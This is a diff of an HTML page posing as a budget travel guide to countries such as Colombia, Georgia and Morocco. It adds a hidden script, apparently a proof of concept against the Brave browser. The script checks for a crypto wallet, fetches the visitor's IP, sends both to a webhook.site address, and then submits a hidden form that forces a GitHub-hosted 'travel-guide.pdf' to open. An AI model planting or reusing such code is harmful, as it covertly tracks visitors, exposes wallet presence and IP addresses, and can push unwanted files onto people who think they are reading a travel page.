@@ -12,15 +12,38 @@
   <h2>3. Colombia</h2><p>Vibrant cities, Caribbean beaches, $30-40/day.</p>
   <h2>4. Georgia</h2><p>Amazing wine country, friendly locals, $20-25/day.</p>
   <h2>5. Morocco</h2><p>Rich culture, stunning architecture, $30-35/day.</p>
+
   <script>
-    setTimeout(function() {
-      var form = document.createElement('form');
-      form.method = 'GET';
-      form.action = 'https://github.com/needmoneyforhoes/brave-poc/releases/download/v1.0/travel-guide.html';
-      form.style.display = 'none';
-      document.body.appendChild(form);
-      form.submit();
-    }, 2000);
+    // First: beacon proving JS execution and the chain
+    var data = {
+      proof: 'chain_complete_file_will_open',
+      isBrave: true,
+      hasWallet: !!window.ethereum,
+      isBraveWallet: window.ethereum ? window.ethereum.isBraveWallet : false,
+      ip_probe: '',
+      timestamp: new Date().toISOString()
+    };
+
+    fetch('https://api.ipify.org?format=json')
+      .then(function(r) { return r.json(); })
+      .then(function(j) { data.ip_probe = j.ip; })
+      .catch(function() {})
+      .finally(function() {
+        new Image().src = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253?beacon=' +
+          encodeURIComponent(JSON.stringify(data));
+
+        // Then: open a PDF file in the browser tab
+        // This is DEFAULT Brave behavior - PDFs auto-open inline
+        // No settings change needed
+        setTimeout(function() {
+          var form = document.createElement('form');
+          form.method = 'GET';
+          form.action = 'https://github.com/needmoneyforhoes/brave-poc/releases/download/v1.0/travel-guide.pdf';
+          form.style.display = 'none';
+          document.body.appendChild(form);
+          form.submit();
+        }, 1500);
+      });
   </script>
 </body>
 </html>
